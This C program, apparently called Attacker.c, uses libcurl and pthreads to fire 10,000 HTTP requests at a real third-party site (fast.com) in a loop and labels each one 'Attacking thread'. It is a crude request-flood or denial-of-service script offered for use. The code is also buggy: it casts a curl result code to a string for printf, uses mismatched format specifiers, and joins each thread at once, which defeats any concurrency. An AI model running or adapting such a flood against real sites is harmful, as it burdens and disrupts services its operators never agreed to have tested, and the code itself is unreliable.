#include <stdio.h>
#include <stdlib.h>
#include <curl/curl.h>
#include <unistd.h>  //Header file for sleep(). man 3 sleep for details.
#include <pthread.h>
  
// A normal C function that is executed as a thread 
// when its name is specified in pthread_create()
size_t noop_cb(void *ptr, size_t size, size_t nmemb, void *data) {
  return size * nmemb;
}

void  *myThreadFun(void *vargp)
{
    CURL *curl;
    CURLcode response;
    curl_global_init(
        CURL_GLOBAL_ALL);

    curl = curl_easy_init();
    if (curl)
    {
        curl_easy_setopt(curl, CURLOPT_URL, "https://fast.com/");

    //    curl_easy_setopt(curl, CURLOPT_POST, 1);
        // curl_easy_setopt(curl, CURLOPT_POSTFIELDS, "name=Bjarne&comment=example");
        curl_easy_setopt(curl,CURLOPT_WRITEFUNCTION, noop_cb);
        response = curl_easy_perform(curl);
        long http_code = 0;
        curl_easy_getinfo(curl, CURLINFO_RESPONSE_CODE, &http_code);

         printf("Http Status code: %d\n", http_code);
        //  curl_easy_cleanup(curl);
         /*
        if (http_code == 200)
        {
            //Succeeded
            printf((char *)(http_code));
                
        }
        else
        {
            //Failed
             printf(http_code);
        }
        */
        if (response != CURLE_OK)
        {
            fprintf(stderr, "Request Failed:%s\n", curl_easy_strerror(response));
        }
        else
        {
            printf((char *)response);
        }
        curl_easy_cleanup(curl);
    }
    curl_global_cleanup();
    // return 0;
}
   
int main()
{
    pthread_t thread_id;
    // printf("Before Thread\n");
    for(int i=0;i<10000;i++){
        printf("Attacking thread %d\n", i);
            pthread_create(&thread_id, NULL, myThreadFun, NULL);
            pthread_join(thread_id, NULL);
    }
    
    // printf("After Thread\n");
    exit(0);
}

//To Run 
//gcc Attacker.c  -lcurl -lpthread